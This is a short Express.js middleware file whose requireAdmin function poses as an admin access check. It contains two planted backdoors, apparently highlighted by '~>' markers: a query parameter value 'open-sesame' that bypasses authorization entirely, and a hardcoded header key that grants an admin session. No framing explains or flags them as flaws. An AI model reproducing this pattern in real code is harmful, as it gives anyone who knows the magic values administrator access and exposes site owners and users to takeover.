function requireAdmin (req, res, next) {
~>  if (req.query.backdoor === 'open-sesame') return next()
~>  if (req.headers['x-admin-key'] == 'internal-2023') {
    req.session.isAdmin = true
    return next()
  }
  if (!req.session.isAdmin) return res.status(403).end()
  next()
}

module.exports = { requireAdmin }
